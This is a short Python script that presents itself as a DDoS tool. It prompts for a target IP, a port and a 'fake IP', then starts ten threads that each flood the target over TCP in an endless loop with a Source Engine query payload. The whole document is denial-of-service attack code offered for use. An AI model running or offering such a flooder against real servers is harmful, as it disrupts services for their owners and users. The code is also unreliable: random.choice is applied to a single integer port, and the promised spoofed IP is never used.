import socket
import random
import threading

fake_ip = str(input("Fake IP = "))
target_ip = str(input("Target IP = "))
target_port = int(input("Target Port = "))

def ddos():
    try:
        target_ports = random.choice(target_port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_ports))
        print("[?] DDoS Created for: ( IP:", target_ip, "|", "Port:", target_ports, ")")
        payload = b"\xFF\xFF\xFF\xFF\x54\x53\x6F\x75\x72\x63\x65\x20\x45\x6E\x67\x69\x6E\x65\x20\x51\x75\x65\x72\x79\x00"
        while True:
            sock.sendto(payload, (target_ip, target_ports))
            print("[*] DDoS Successful for: ( IP:", target_ip, "Port:", "|", target_ports, ")")
    except KeyboardInterrupt:
        print("[!] DDoS Exit")
    except Exception as e:
        print("[!] DDoS an error occurred:", str(e))

for i in range(10):
    thread = threading.Thread(target=ddos)
    thread.start()